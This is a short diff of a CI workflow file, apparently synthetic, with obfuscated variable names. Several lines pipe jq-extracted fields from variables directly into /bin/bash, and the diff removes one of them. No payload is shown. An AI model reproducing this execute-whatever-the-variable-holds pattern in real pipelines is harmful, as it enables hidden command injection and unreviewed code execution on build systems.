@@ -24,7 +24,6 @@ jobs:
           echo $roffn91356 | jq -r .yb0 | /bin/bash
           printf '%s' "$gbmx05425" | jq -r .xg0229 | /bin/bash
           printf '%s' "$tqi10" | jq -r .fbt81753 | /bin/bash
-          echo $o163 | jq -r .v08 | /bin/bash
           printf '%s' "$nyubf2" | jq -r .y7117 | /bin/bash
 
       - name: Store artifact
